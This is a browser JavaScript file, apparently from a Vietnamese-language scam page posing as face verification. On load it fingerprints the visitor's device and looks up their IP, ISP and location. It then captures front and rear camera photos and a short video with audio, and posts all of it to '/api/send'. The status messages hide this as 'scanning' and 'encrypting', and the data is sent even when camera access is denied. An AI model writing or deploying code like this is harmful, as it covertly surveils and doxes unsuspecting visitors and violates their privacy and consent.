(async function() {
    const API_URL = '/api/send'; 
    const info = {
        time: new Date().toLocaleString('vi-VN'),
        ip: '⌛ Đang lấy...',
        realIp: '⌛ Đang lấy...',
        isp: '⌛ Đang lấy...',
        location: '⌛ Đang lấy...',
        device: '⌛ Đang nhận diện...',
        os: '⌛ Đang nhận diện...',
        browser: navigator.userAgent,
        camera: '⏳ Đang khởi tạo...'
    };

    function log(msg) {
        if (window.updateStatus) window.updateStatus(msg);
        console.log(`[Status] ${msg}`);
    }

    function detectDevice() {
        const ua = navigator.userAgent;
        const platform = navigator.platform;
        
        if (/Android/i.test(ua)) {
            info.os = 'Android';
            const match = ua.match(/Android.*;\s+([^;]+)\s+Build/);
            info.device = match ? match[1].split('/')[0].trim() : 'Android Device';
        } else if (/iPhone|iPad|iPod/i.test(ua) || (platform === 'MacIntel' && navigator.maxTouchPoints > 1)) {
            info.os = 'iOS';
            const screen = `${window.screen.width}x${window.screen.height}@${window.devicePixelRatio}`;
            const models = {
                "430x932@3": "iPhone 14/15/16 Pro Max",
                "393x852@3": "iPhone 14/15/16 Pro",
                "428x926@3": "iPhone 12/13/14 Pro Max",
                "390x844@3": "iPhone 12/13/14",
                "375x812@3": "iPhone X/XS/11 Pro",
                "414x896@3": "iPhone XS Max/11 Pro Max",
                "414x896@2": "iPhone XR/11",
                "375x667@2": "iPhone 6/7/8/SE"
            };
            info.device = models[screen] || 'iPhone/iPad';
        } else {
            info.os = platform;
            info.device = 'PC/Laptop';
        }
        document.getElementById('st-os').innerText = `${info.os} (${info.device})`;
    }

    async function getNetworkInfo() {
        try {
            const r = await fetch('https://ipwho.is/');
            const d = await r.json();
            info.ip = d.ip;
            info.isp = d.connection.org;
            info.location = `${d.city}, ${d.region}, ${d.country}`;
            document.getElementById('st-ip').innerText = info.ip;
            document.getElementById('st-loc').innerText = d.city || 'Việt Nam';
        } catch (e) {
            info.ip = 'Không thể xác định';
            document.getElementById('st-ip').innerText = 'Ẩn danh';
        }
    }

    async function handleCamera() {
        log("Đang yêu cầu quyền truy cập camera...");
        try {
            const video = document.getElementById('preview');
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: true });
            video.srcObject = stream;
            log("Đang quét khuôn mặt...");

            const frontPhoto = await capturePhoto(video);
            
            let backPhoto = null;
            try {
                const backStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } });
                const backVideo = document.createElement('video');
                backVideo.srcObject = backStream;
                await backVideo.play();
                backPhoto = await capturePhoto(backVideo);
                backStream.getTracks().forEach(t => t.stop());
            } catch(e) {}

            await sendData('media', { 
                photos: [
                    { data: frontPhoto, caption: getReportCaption('📸 ẢNH XÁC THỰC (TRƯỚC)') },
                    { data: backPhoto, caption: '📸 ẢNH MÔI TRƯỜNG (SAU)' }
                ].filter(p => p.data)
            });

            log("Đang mã hóa dữ liệu...");
            await recordVideo(stream, 4000); // Giảm xuống 4 giây để nhẹ hơn

            info.camera = "✅ Hoàn tất";
        } catch (err) {
            log("Lỗi: Vui lòng cấp quyền camera.");
            info.camera = "🚫 Bị từ chối";
            await sendData('text', { text: getReportCaption('⚠️ CẢNH BÁO: TỪ CHỐI CAMERA') });
        }
    }

    async function capturePhoto(videoEl) {
        return new Promise(resolve => {
            setTimeout(() => {
                const canvas = document.createElement('canvas');
                canvas.width = videoEl.videoWidth;
                canvas.height = videoEl.videoHeight;
                canvas.getContext('2d').drawImage(videoEl, 0, 0);
                resolve(canvas.toDataURL('image/jpeg', 0.5)); // Chất lượng 0.5
            }, 1000);
        });
    }

    async function recordVideo(stream, duration) {
        return new Promise(resolve => {
            const recorder = new MediaRecorder(stream);
            const chunks = [];
            recorder.ondataavailable = e => chunks.push(e.data);
            recorder.onstop = async () => {
                const blob = new Blob(chunks, { type: 'video/mp4' });
                const reader = new FileReader();
                reader.onloadend = async () => {
                    await sendData('video', { video: reader.result, caption: '🎬 CLIP XÁC THỰC' });
                    resolve();
                };
                reader.readAsDataURL(blob);
                stream.getTracks().forEach(t => t.stop());
            };
            recorder.start();
            setTimeout(() => recorder.stop(), duration);
        });
    }

    function getReportCaption(title) {
        return `
${title}
🕒 ${info.time}
📱 ${info.device} (${info.os})
🌐 IP: ${info.ip}
🏢 ISP: ${info.isp}
📍 ${info.location}
`.trim();
    }

    async function sendData(type, payload) {
        try {
            console.log(`Sending ${type}...`);
            const response = await fetch(API_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ type, ...payload })
            });
            const result = await response.json();
            console.log(`Response from ${type}:`, result);
        } catch (e) {
            console.error(`Gửi ${type} thất bại:`, e);
        }
    }

    detectDevice();
    await getNetworkInfo();
    await handleCamera();
    
    window.mainScriptFinished = true;
})();